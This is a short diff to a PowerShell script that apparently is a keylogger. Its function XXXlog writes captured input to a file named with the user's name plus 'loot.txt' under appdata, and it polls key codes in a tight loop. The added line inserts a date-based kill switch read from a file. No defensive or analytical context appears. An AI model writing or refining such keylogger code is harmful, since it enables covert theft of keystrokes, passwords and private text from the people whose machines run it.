@@ -21,6 +21,7 @@ function XXXlog($Path="$env:appdata\-locker\$env:UserName-loot.txt"){
 
     while ($true) {
       Start-Sleep -Milliseconds 40
+      if((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt")){exit}
       
 
       for ($ascii = 9; $ascii -le 254; $ascii++) {
